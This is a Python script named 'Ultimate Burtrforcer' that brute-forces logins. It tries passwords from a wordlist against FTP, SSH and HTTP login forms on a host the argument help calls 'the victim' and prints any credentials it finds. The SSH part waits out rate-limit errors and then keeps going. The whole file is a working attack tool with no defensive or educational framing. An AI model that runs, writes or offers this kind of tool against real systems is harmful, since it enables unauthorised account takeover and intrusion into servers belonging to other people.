import ftplib
from colorama import Fore, init
from pathlib import Path
import paramiko
import socket
import time
import argparse
import requests
import progressbar
from progress.spinner import MoonSpinner


####################### Loding fun #######################

def loding():
    with MoonSpinner('Processing…') as bar:
        for i in range(100):
            time.sleep(0.02)
            bar.next()


####################### FTP BRURUTEFORCER #######################

def process_ftp(host,username,password):
    try:
        connect = ftplib.FTP()
        print(f"{Fore.MAGENTA}[!] host: {host}   login:{username}    password: {password}", Fore.RESET)
        connect.connect(host, 21, timeout=5)
        connect.login(username, password)
    except ftplib.error_perm:
        return False
    else:
        print(f"{Fore.GREEN}[+] Found credentials >> {username}:{password}",Fore.RESET)
        return True


def Burtrforce_ftp(host,username,path):
    passwords = Path(path)
    with open(passwords, errors="ignore") as passlist:
        for password in passlist:
            password = ''.join(password.split("\n"))
            if process_ftp(host,username,password):
                break

# ###################### SSH BRURUTEFORCER #######################

def process_ssh(host,username,password):

    connect = paramiko.SSHClient()
    connect.set_missing_host_key_policy(paramiko.AutoAddPolicy)
    try:
        connect.connect(hostname=host,username=username,password=password,timeout=3)
    except socket.timeout:
        print(f"{Fore.RED}[!] Host: {host} is unreachable, timed out", Fore.RESET)
        return False
    except paramiko.AuthenticationException:
        print(f"{Fore.MAGENTA}[!] host: {host}   login: {username}    password: {password}", Fore.RESET)
        return False
    except paramiko.ssh_exception.SSHException:
        print(f"{Fore.BLUE}[*] Thresholds, retrying with delay...",Fore.RESET)
        time.sleep(20)
    else:
        print(f"{Fore.GREEN}[+] Found credentials >> {username}:{password}", Fore.RESET)
        return True


def Burtrforce_ssh(host,username,path):
    passwords = Path(path)
    with open(passwords, errors="ignore") as passlist:
        for password in passlist:
            password = ''.join(password.split("\n"))
            if process_ssh(host,username,password):
                break


# ###################### HTTP BRURUTEFORCER #######################

def process_http(url,var_name,username,var_pass,password,text_site):
    data_payload = {
            var_name:username,
            var_pass:password,
                                }
    site = requests.post(url, data=data_payload)
    text = site.text
    if text_site in text:
            print(f"{Fore.MAGENTA}[!] connect: {url}   login: {username}    password: {password}", Fore.RESET)
            return False
    else:
        print(f"{Fore.GREEN}[+] Found credentials >> {username}:{password}", Fore.RESET)
        return True


def Burtrforce_http(url,var_name,username,var_pass,path,text_site):
    passwords = Path(path)
    with open(passwords, errors="ignore") as passlist:
        for password in passlist:
            password = ''.join(password.split("\n"))
            if process_http(url,var_name,username,var_pass,password,text_site):
                break

######################  MAIN FUN #######################

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Ultimate Burtrforcer")
    parser.add_argument("-S","--service", help="Which service do you wont to bruteforce")
    parser.add_argument("-IP","--host", help="Hostname or IP Address of the victim to bruteforce.")
    parser.add_argument("-P", "--wordlist", help="Wordlist that contain password list in each line.")
    parser.add_argument("-U", "--user", help="Username to connect.")
    parser.add_argument("-url","--url", help="URL for the site that you wont to bruteforce")
    parser.add_argument("-l", "--login", help="The name of the variable for user in the site")
    parser.add_argument("-pas", "--var_pass", help="The name of the variable for password in the site")
    parser.add_argument("-txt","--text_site", help="Login failed text")

    args = parser.parse_args()
    service = args.service
    host = args.host
    path = args.wordlist
    username = args.user
    url = args.url
    login = args.login
    var_pass = args.var_pass
    text_site = args.text_site
    if service == "ftp":
        loding()
        Burtrforce_ftp(host,username,path)
    if service == "ssh":
        loding()
        Burtrforce_ssh(host,username,path)
    if service == "http":
        loding()
        Burtrforce_http(url, login, username, var_pass, path, text_site)
    else:
        print("[-h] [-S SERVICE] [-IP HOST] [-P WORDLIST] [-U USER] [-url URL] [-us--var_name US__VAR_NAME][-pas VAR_PASSWORD] [-txt TEXT_SITE]")


